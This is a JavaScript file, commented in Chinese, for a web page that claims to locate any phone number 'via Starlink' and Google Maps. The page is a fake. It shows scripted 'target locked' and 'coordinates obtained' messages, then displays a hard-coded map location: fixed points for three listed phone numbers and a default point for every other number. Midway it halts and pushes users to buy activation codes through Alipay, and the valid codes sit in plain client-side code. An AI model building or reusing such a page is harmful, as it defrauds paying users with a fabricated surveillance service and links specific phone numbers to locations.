document.addEventListener('DOMContentLoaded', function() {
    // 检测设备类型
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    const isIE = window.navigator.userAgent.indexOf('MSIE ') > -1 || window.navigator.userAgent.indexOf('Trident/') > -1;
    
    // 为移动设备添加特定类
    if (isMobile) {
        document.body.classList.add('mobile-device');
        
        // 修复iOS中100vh问题
        if (isIOS) {
            const fixHeight = () => {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            };
            
            fixHeight();
            window.addEventListener('resize', fixHeight);
            window.addEventListener('orientationchange', fixHeight);
        }
    }
    
    // IE特殊处理
    if (isIE) {
        document.body.classList.add('ie-browser');
        
        // 为IE添加classList兼容
        if (!('classList' in document.documentElement)) {
            const addClassMethod = function(el, className) {
                if (!el.className.includes(className)) {
                    el.className += ' ' + className;
                }
            };
            
            const removeClassMethod = function(el, className) {
                el.className = el.className.replace(new RegExp('\\b' + className + '\\b', 'g'), '');
            };
            
            // 覆盖classList方法
            Object.defineProperty(Element.prototype, 'classList', {
                get: function() {
                    return {
                        add: function(className) { addClassMethod(this, className); }.bind(this),
                        remove: function(className) { removeClassMethod(this, className); }.bind(this)
                    };
                }
            });
        }
    }
    
    // 激活码
    const VALID_ACTIVATION_CODES = [
        "djfk3j4adf",
        "28fhsj283",
        "fsd23gdfg",
        "f3sd54gg",
        "13g55gvz"
    ];
    
    // 不再初始禁用提交按钮
    const submitBtn = document.querySelector('.submit-btn');
    
    // 弹窗元素
    const overlay = document.getElementById('overlay');
    const closePopupBtn = document.getElementById('closePopup');
    const confirmBtn = document.getElementById('confirmActivation');
    const cancelBtn = document.getElementById('cancelActivation');
    const popupActivationInput = document.getElementById('popupActivationCode');
    const buyBtn = document.getElementById('buyActivation');
    
    // 购买弹窗元素
    const purchaseOverlay = document.getElementById('purchaseOverlay');
    const closePurchaseBtn = document.getElementById('closePurchase');
    const purchaseBtns = document.querySelectorAll('.purchase-btn');
    
    // 保存当前处理中的状态
    let currentMessageInterval = null;
    let currentIndex = 0;
    let currentMessages = [];
    let targetMapUrl = "";
    
    // 显示弹窗
    function showPopup() {
        overlay.classList.add('active');
        setTimeout(() => {
            popupActivationInput.focus();
        }, 300);
    }
    
    // 隐藏弹窗
    function hidePopup() {
        overlay.classList.remove('active');
    }
    
    // 显示购买弹窗
    function showPurchasePopup() {
        purchaseOverlay.classList.add('active');
    }
    
    // 隐藏购买弹窗
    function hidePurchasePopup() {
        purchaseOverlay.classList.remove('active');
    }
    
    // 添加触摸设备支持
    if (isMobile) {
        // 防止在输入框聚焦时固定背景
        const preventFixedBackground = function() {
            document.body.style.position = '';
            document.body.style.top = '';
            document.body.style.width = '';
            document.body.style.height = '';
            document.body.style.overflow = '';
            window.scrollTo(0, parseInt(document.body.style.top || '0') * -1);
        };
        
        const inputs = document.querySelectorAll('input, select');
        inputs.forEach(input => {
            input.addEventListener('focus', preventFixedBackground);
            input.addEventListener('blur', preventFixedBackground);
        });
        
        // 添加触摸事件支持
        const addTouchSupport = function(element) {
            if (!element) return;
            
            // 添加触摸反馈
            element.addEventListener('touchstart', function() {
                this.classList.add('touch-active');
            }, {passive: true});
            
            element.addEventListener('touchend', function() {
                this.classList.remove('touch-active');
            }, {passive: true});
        };
        
        // 为按钮添加触摸支持
        const buttons = document.querySelectorAll('button');
        buttons.forEach(addTouchSupport);
    }
    
    // 弹窗事件监听器
    closePopupBtn.addEventListener('click', hidePopup);
    cancelBtn.addEventListener('click', hidePopup);
    
    // 购买弹窗事件监听器
    closePurchaseBtn.addEventListener('click', hidePurchasePopup);
    
    // 购买激活码按钮事件
    buyBtn.addEventListener('click', function() {
        hidePopup();
        setTimeout(() => {
            showPurchasePopup();
        }, 300);
    });
    
    // 处理购买按钮点击
    purchaseBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            const plan = this.getAttribute('data-plan');
            
            // 显示处理中状态
            const originalText = this.innerHTML;
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 处理中...';
            this.disabled = true;
            
            // 获取套餐信息
            const planText = plan === 'monthly' ? '30天' : plan === 'quarterly' ? '90天' : '365天';
            const priceText = this.closest('.purchase-option').querySelector('.price').textContent;
            const descText = `${planText}激活码`;
            
            // 隐藏购买弹窗
            hidePurchasePopup();
            
            // 显示支付宝支付弹窗
            setTimeout(() => {
                // 恢复按钮状态
                this.innerHTML = originalText;
                this.disabled = false;
                
                // 显示支付宝二维码支付弹窗
                window.paymentUI.showPaymentModal(plan, priceText, descText);
            }, 500);
        });
    });
    
    // 确认按钮事件
    confirmBtn.addEventListener('click', function() {
        const popupCode = popupActivationInput.value;
        if (VALID_ACTIVATION_CODES.includes(popupCode)) {
            // 显示成功提示
            const popupContent = document.querySelector('.popup-content p');
            popupContent.textContent = "激活码验证成功！正在继续定位...";
            popupContent.style.color = "var(--success-color)";
            
            // 延时后关闭弹窗并继续
            setTimeout(() => {
                hidePopup();
                
                // 获取主表单激活码输入框，并设置正确的激活码
                const mainActivationInput = document.getElementById('activationCode');
                mainActivationInput.value = popupCode;
                
                // 触发input事件更新状态
                const inputEvent = new Event('input', { bubbles: true });
                mainActivationInput.dispatchEvent(inputEvent);
                
                // 恢复消息显示
                resumeMessageDisplay();
            }, 1000);
        } else {
            // 显示错误提示
            const popupContent = document.querySelector('.popup-content p');
            
            if (popupCode === "") {
                popupContent.textContent = "请输入激活码，不能为空!";
            } else if (popupCode.length < 8) {
                popupContent.textContent = "激活码不正确，请检查输入!";
            } else {
                popupContent.textContent = "激活码错误，请输入正确的激活码!";
            }
            
            popupContent.style.color = "#e74c3c";
            
            // 显示输入框错误状态
            popupActivationInput.classList.add('error');
            
            // 晃动效果
            const popup = document.querySelector('.custom-popup');
            popup.classList.add('shake');
            setTimeout(() => {
                popup.classList.remove('shake');
            }, 500);
        }
    });
    
    // 弹窗输入框事件监听器
    popupActivationInput.addEventListener('input', function() {
        this.classList.remove('error');
        
        // 获取输入值
        const popupCode = this.value;
        const popupContent = document.querySelector('.popup-content p');
        
        // 重置文本颜色
        popupContent.style.color = "";
        
        // 根据输入内容更新提示
        if (popupCode === "") {
            popupContent.textContent = "需要输入正确的激活码才能继续定位!";
        } else if (VALID_ACTIVATION_CODES.includes(popupCode)) {
            popupContent.textContent = "激活码验证通过，点击确认继续";
            popupContent.style.color = "var(--success-color)";
            this.classList.add('valid-input');
        } else {
            popupContent.textContent = "需要输入正确的激活码才能继续定位!";
            this.classList.remove('valid-input');
        }
    });
    
    // 当按下Enter键时，触发确认按钮
    popupActivationInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            confirmBtn.click();
        }
    });
    
    // 恢复消息显示函数
    function resumeMessageDisplay() {
        const statusMessage = document.getElementById('statusMessage');
        
        // 重新开始显示消息，从上次停止的地方继续
        currentMessageInterval = setInterval(() => {
            if (currentIndex < currentMessages.length) {
                const isLastMessage = currentIndex === currentMessages.length - 1;
                const messageClass = isLastMessage ? 'success-message' : '';
                const icon = isLastMessage ? '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> ' : '<div class="loader"></div>';
                statusMessage.innerHTML += `<br>${icon}<span class="${messageClass}">${currentMessages[currentIndex]}</span>`;
                
                // 滚动到最新消息
                statusMessage.scrollTop = statusMessage.scrollHeight;
                currentIndex++;
            } else {
                clearInterval(currentMessageInterval);
                // 所有消息显示完毕后更改地图坐标
                setTimeout(() => {
                    // 更改地图坐标
                    const iframe = document.querySelector('.map-frame iframe');
                    iframe.src = targetMapUrl;
                    
                    // 恢复按钮状态
                    setTimeout(() => {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = '<i class="fas fa-satellite"></i>开始追踪';
                    }, 1000);
                    
                }, 500); // 短暂延迟后更改地图
            }
        }, 1000); // 每秒显示一行
    }

    // 国家选择事件监听器
    document.getElementById('country').addEventListener('change', function() {
        const countryCode = this.value;
        const phoneInput = document.getElementById('phone');
        
        // 根据不同国家设置不同的验证规则
        if (countryCode === '+86') {
            phoneInput.pattern = '[0-9]{11}';
            phoneInput.placeholder = '输入11位手机号码';
        } else if (countryCode === '+1') {
            phoneInput.pattern = '[0-9\\s]{10,12}';
            phoneInput.placeholder = '输入美国手机号码 (例如: xxx xxx xxxx)';
        } else {
            phoneInput.pattern = '[0-9\\s]{5,15}';
            phoneInput.placeholder = '输入手机号码';
        }
    });
    
    // 激活码输入事件监听器
    document.getElementById('activationCode').addEventListener('input', function() {
        const activationCode = this.value;
        const activationError = document.getElementById('activationError');
        const activationInput = document.getElementById('activationCode');
        
        if (VALID_ACTIVATION_CODES.includes(activationCode)) {
            activationError.textContent = "激活码正确";
            activationError.classList.add('valid');
            activationError.classList.remove('highlight');
            activationInput.classList.remove('error');
            activationInput.classList.add('valid-input');
        } else {
            if (activationCode) {
                activationError.textContent = "激活码错误";
                activationInput.classList.add('error');
                activationInput.classList.remove('valid-input');
            } else {
                activationError.textContent = "";
                activationInput.classList.remove('error');
                activationInput.classList.remove('valid-input');
            }
            activationError.classList.remove('valid');
        }
    });

    // 表单提交事件监听器
    document.getElementById('phoneForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const countryCode = document.getElementById('country').value;
        const phoneNumber = document.getElementById('phone').value;
        const activationCode = document.getElementById('activationCode').value;
        const activationError = document.getElementById('activationError');
        
        // 清除错误信息
        activationError.textContent = "";
        
        // 显示状态消息
        const statusMessage = document.getElementById('statusMessage');
        statusMessage.style.display = 'block';
        statusMessage.innerHTML = `<div class="loader"></div>正在追踪${countryCode} ${phoneNumber}...`;
        
        // 滚动到状态消息区域，保证移动端用户看到进度
        if (isMobile) {
            statusMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
        
        // 定义要显示的消息
        const messages = [
            "启动星链Starlink定位中...",
            "目标已锁定...",
            "调用GoogleMaps JS API...",
            "正在请求GoogleMaps地图坐标...",
            "坐标获取成功...",
            "坐标值返回...",
            "定位成功, 感谢您的使用!"
        ];
        
        // 保存消息和处理状态，用于弹窗后恢复
        currentMessages = messages;
        currentIndex = 0;
        
        // 位置标记（先隐藏）
        const locationMarker = document.getElementById('locationMarker');
        const mapFrame = document.querySelector('.map-frame');
        
        // 禁用按钮，防止多次点击
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>追踪中...';
        
        // 根据手机号码设置不同的坐标
        // 去除手机号中的空格进行比较
        const cleanedPhoneNumber = phoneNumber.replace(/\s+/g, '');
        if (phoneNumber === "15088882646") {
            // 坐标设置为：30.020893354017094, 122.11229801265165
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3534.9583093839384!2d122.11229801265165!3d30.020893354017094!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzDCsDAxJzE1LjIiTiAxMjLCsDA2JzQ0LjMiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        } else if (phoneNumber === "13016044122") {
            // 坐标设置为：23.54558922773105, 113.5873670114466
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3763.2257279650283!2d113.5873670114466!3d23.54558922773105!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDMyJzQ0LjEiTiAxMTPCsDM1JzE0LjUiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        } else if (cleanedPhoneNumber === "6502318772" || phoneNumber === "650 231 8772") {
            // 坐标设置为：36.326581298778144, -119.24660948936832
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3184.6424075827864!2d-119.24660948936832!3d36.326581298778144!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzbCsDE5JzM1LjciTiAxMTnCsDE0JzQ3LjgiVw!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        } else {
            // 默认使用之前的坐标：22.727928998586016, 113.84220580896196
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3684.5494214967284!2d113.84220580896196!3d22.727928998586016!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjLCsDQzJzQwLjUiTiAxMTPCsDUwJzMxLjkiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        
        // 逐行显示消息，添加打字机效果
        currentMessageInterval = setInterval(() => {
            if (currentIndex < messages.length) {
                const isLastMessage = currentIndex === messages.length - 1;
                const messageClass = isLastMessage ? 'success-message' : '';
                const icon = isLastMessage ? '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> ' : '<div class="loader"></div>';
                statusMessage.innerHTML += `<br>${icon}<span class="${messageClass}">${messages[currentIndex]}</span>`;
                
                // 滚动到最新消息
                statusMessage.scrollTop = statusMessage.scrollHeight;
                
                // 当消息显示到"目标已锁定..."时，检查激活码
                if (currentIndex === 1 && !VALID_ACTIVATION_CODES.includes(activationCode)) {
                    // 清除消息间隔，停止显示后续消息
                    clearInterval(currentMessageInterval);
                    
                    // 添加一个小延迟，让用户能看到"目标已锁定..."的消息
                    setTimeout(() => {
                        // 显示自定义弹窗
                        showPopup();
                        
                        // 重置弹窗输入框
                        popupActivationInput.value = '';
                        popupActivationInput.classList.remove('error');
                    }, 500);
                    
                    return;
                }
                
                currentIndex++;
            } else {
                clearInterval(currentMessageInterval);
                // 所有消息显示完毕后更改地图坐标
                setTimeout(() => {
                    // 更改地图坐标
                    const iframe = document.querySelector('.map-frame iframe');
                    iframe.src = targetMapUrl;
                    
                    // 恢复按钮状态
                    setTimeout(() => {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = '<i class="fas fa-satellite"></i>开始追踪';
                        
                        // 在移动设备上显示成功后滚动到地图
                        if (isMobile) {
                            const mapContainer = document.querySelector('.map-container');
                            mapContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }, 1000);
                    
                }, 500); // 短暂延迟后更改地图
            }
        }, 1000); // 每秒显示一行
    });
    
    // 处理弹窗的适配
    const handleResize = () => {
        // 调整弹窗大小
        if (window.innerWidth < 768) {
            const popups = document.querySelectorAll('.custom-popup');
            popups.forEach(popup => {
                popup.style.maxHeight = `${window.innerHeight * 0.8}px`;
                popup.style.overflow = 'auto';
            });
        }
    };
    
    // 初始调整和窗口大小变化时调整
    handleResize();
    window.addEventListener('resize', handleResize);
    window.addEventListener('orientationchange', handleResize);
}); 